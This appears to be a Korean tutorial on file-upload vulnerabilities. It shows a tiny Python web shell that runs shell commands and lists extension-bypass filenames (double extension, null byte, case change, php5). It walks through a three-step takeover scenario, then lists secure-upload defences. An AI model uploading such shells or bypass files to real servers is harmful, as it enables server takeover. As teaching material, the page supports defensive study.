공격 예제

정상 파일: image.jpg, document.pdf

악의적 파일:

1️⃣ Python 웹쉘 업로드

# shell.py 파일 내용
import os
import sys

if len(sys.argv) > 1:
  os.system(sys.argv[1])
else:
  os.system('whoami')

# 파일을 shell.py로 저장 후 취약코드로 업로드
# "파일 실행" 버튼으로 시스템 명령어 실행 가능!

2️⃣ 확장자 우회 시도

  • shell.php.jpg - 이중 확장자
  • shell.php%00.jpg - Null byte injection
  • shell.pHp - 대소문자 우회
  • shell.php5 - 대체 확장자

3️⃣ 실제 공격 시나리오

# 1단계: Python 웹쉘 파일 생성
# shell.py 파일을 만들어 악성 코드 작성

# 2단계: 취약한 업로드 기능으로 파일 업로드
# 서버가 파일 확장자만 보고 .jpg로 판단하도록 shell.py 업로드

# 3단계: 업로드된 파일 실행
# "파일 실행" 버튼으로 whoami, ls 등 시스템 명령어 실행

# 결과: 서버 제어권 탈취! 🚨

💡 안전한 파일 업로드 구현

# 1. 파일 크기 제한
max_size = 5 * 1024 * 1024 # 5MB

# 2. 확장자 화이트리스트
allowed_ext = ['.jpg', '.png', '.pdf']

# 3. MIME 타입 검증
allowed_mimes = ['image/jpeg', 'image/png']

# 4. 파일명 무작위화
safe_name = f"{uuid.uuid4()}.jpg"

# 5. 웹 루트 외부에 저장
# 6. 실행 권한 제거
# 7. 업로드된 파일은 절대 실행하지 않기!

실제 공격 결과

  • 웹쉘 업로드 → 시스템 명령어 실행
  • 악성 스크립트 업로드 → 다른 사용자 감염
  • 대용량 파일 업로드 → 서비스 거부 공격(DoS)
  • 민감한 파일 덮어쓰기 → 설정 파일 변조
